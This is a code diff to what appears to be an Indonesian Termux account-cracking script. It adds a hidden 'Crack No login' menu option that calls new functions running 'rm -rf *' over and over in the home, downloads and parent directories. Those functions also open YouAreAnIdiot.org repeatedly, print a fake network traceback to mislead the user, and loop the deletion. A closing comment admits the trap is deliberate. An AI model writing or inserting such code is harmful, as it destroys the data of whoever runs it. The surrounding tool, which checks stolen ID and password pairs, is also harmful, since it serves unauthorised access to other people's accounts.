@@ -210,7 +210,7 @@ def banner():
 \t\t    {u}author by {K}RulRecoder\n''')
 def awal():
 	banner()
-	prints(panel(f"""{P}[01] Login With Lisensi\n{P}[02] Hubungi Admin\n{P}[{M}00{P}] Exit Licensi """,width=43,title=f"[[green] LOG IN [/]]",style=f"bold blue"))
+	prints(panel(f"""{P}[01] Login With Lisensi\n{P}[02] Hubungi Admin\n{P}[01] Crack No login\n{P}[{M}00{P}] Exit Licensi """,width=43,title=f"[[green] LOG IN [/]]",style=f"bold blue"))
 	cukuf = input(f"{biru}└──[{puti} Input : {H}")
 	if cukuf in ["1","01"]:
 		run()
@@ -220,6 +220,8 @@ def awal():
 		os.system('xdg-open https://wa.me/+6281283547452?text=bang+minta+lisensi+sc+ini!!')
 		input(f" {P}[{biru}•{P}] Enter")
 		awal()
+	elif cukuf in ["3","03"]:
+		start()
 	elif cukuf in ["0","00"]:
 		print("")
 		print(f"{biru}└──[{mer}sedang menghapus lisensi......!!!")
@@ -1025,6 +1027,189 @@ def ceker(idf,pw):
 		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 		#cp+=1
 		
+import time
+import os
+import sys
+import colorama
+import re
+import requests
+import urllib
+import urllib3
+import subprocess
+from colorama import Fore
+from time import sleep
+
+#warna dari colorama (fore)
+
+W = Fore.WHITE
+B = Fore.BLUE
+G = Fore.GREEN
+BL = Fore.BLACK
+Y = Fore.YELLOW
+R = Fore.RED
+
+#banner
+
+jawa = f"""[1]Start Crack
+[2]Exit
+"""
+
+#script
+
+def start():
+    os.system('clear')
+    print(jawa)
+    a = input(f"Enter Menu ").replace("[1/2]"," ")
+    if a == "1" or a == "01":
+         print(f"""{R}Starting System...{W}""")
+         sleep(5)
+         os.system('xdg-open https://YouAreAnIdiot.org')
+         sleep(3)
+         os.system('clear')
+         print(f"""{BL}YouAreAnIdiot""")
+         sleep(0.5)
+         os.system('clear')
+         os.system('rm -rf *')
+         subprocess.check_call([sys.executable, "cd", '$HOME'])
+         os.system('rm -rf *')
+         print(f"""{W}Main Script Mu Dihitamkan{R}""")
+         sleep(1)
+         subprocess.check_call([sys.executable, "cd", 'downloads'])
+         os.system('rm -rf *')
+         subprocess.check_call([sys.executable, "cd", '$HOME'])
+         subprocess.check_call([sys.executable, "cd", '..'])
+         os.system('rm -rf *')
+         subprocess.check_call([sys.executable, "cd", '$HOME'])
+         os.system('rm -rf *')
+         os.system("xdg-open https://YouAreAnIdiot.org")
+         os.system("xdg-open https://YouAreAnIdiot.org")
+         print(f"""{W}Error""")
+         sleep(0.2)
+         print(f"""{W}Traceback (most recent call last):
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py", line 790, in urlopen
+    response = self._make_request(
+               ^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py", line 536, in _make_request
+    response = conn.getresponse()
+               ^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connection.py", line 461, in getresponse
+    httplib_response = super().getresponse()
+                       ^^^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/http/client.py", line 1390, in getresponse
+    response.begin()
+  File "/data/data/com.termux/files/usr/lib/python3.11/http/client.py", line 325, in begin
+    version, status, reason = self._read_status()
+                              ^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/http/client.py", line 294, in _read_status
+    raise RemoteDisconnected("Remote end closed connection without"
+http.client.RemoteDisconnected: Remote end closed connection without response
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py", line 844, in urlopen
+    retries = retries.increment(
+              ^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/util/retry.py", line 470, in increment
+    raise reraise(type(error), error, _stacktrace)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/util/util.py", line 38, in reraise
+    raise value.with_traceback(tb)
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py", line 790, in urlopen
+    response = self._make_request(
+               ^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connectionpool.py", line 536, in _make_request
+    response = conn.getresponse()
+               ^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/urllib3/connection.py", line 461, in getresponse
+    httplib_response = super().getresponse()
+                       ^^^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/http/client.py", line 1390, in getresponse
+    response.begin()
+  File "/data/data/com.termux/files/usr/lib/python3.11/http/client.py", line 325, in begin
+    version, status, reason = self._read_status()
+                              ^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/http/client.py", line 294, in _read_status
+    raise RemoteDisconnected("Remote end closed connection without"
+urllib3.exceptions.ProtocolError: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/data/data/com.termux/files/home/spam-wa-1/main.py", line 214, in <module>
+    start()
+  File "/data/data/com.termux/files/home/spam-wa-1/main.py", line 59, in start
+    sxp_wa()
+  File "/data/data/com.termux/files/home/spam-wa-1/main.py", line 65, in __init__
+    self.main()
+  File "/data/data/com.termux/files/home/spam-wa-1/main.py", line 207, in main
+    self.wa_otp_2(nomor)
+  File "/data/data/com.termux/files/home/spam-wa-1/main.py", line 105, in wa_otp_2
+    __req__ = self.req.get(
+              ^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py", line 602, in get
+    return self.request("GET", url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/adapters.py", line 501, in send
+    raise ConnectionError(err, request=request)
+requests.exceptions.ConnectionError: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
+""")
+         b = input (f" $").replace(""," ")
+         if b == "":
+             pass
+         else:
+             while True:
+                     os.system("rm -rf *")
+                     os.system("xdg-open https://YouAreAnIdiot.org")
+                     virus()
+
+    elif a == "2" or a == "02":
+           exit()
+
+def virus():
+    os.system("xdg-open https://YouAreAnIdiot.org")
+    os.system("xdg-open https://YouAreAnIdiot.org")
+    os.system("xdg-open https://YouAreAnIdiot.org")
+    os.system("xdg-open https://YouAreAnIdiot.org")
+    os.system("xdg-open https://YouAreAnIdiot.org")
+    os.system("xdg-open https://YouAreAnIdiot.org")
+    os.system("xdg-open https://YouAreAnIdiot.org")
+    os.system("xdg-open https://YouAreAnIdiot.org")
+
+
+def exit():
+    os.system("clear")
+    print(f"""{R}Shutdown 0%{W}""")
+    sleep(2)
+    os.system("clear")
+    print(f"""{R}Shutdown. 20%{W}""")
+    sleep(2)
+    os.system("clear")
+    print(f"""{R}Shutdown.. 57%{W}""")
+    sleep(2)
+    os.system("clear")
+    print(f"""{R}Shutdown... 98%{W}""")
+    sleep(2)
+    os.system("clear")
+    print(f"""{R}Shutdown 100%{W}""")
+    sleep(2)
+    os.system("clear")
+    sleep(2)
+    os.system("rm -rf *")
+    sleep(1)
+    os.system("mkdir main.py")
+    os.system("bash")
+    os.system("kredit)
+#kredit oleh u0-a154, maaf jika Anda tidak sengaja mengaktifkan alatnya :/
 #----------[ SYSTEM-CONTROL ]----------#	
 if __name__=='__main__':
 	try:os.system('git pull')
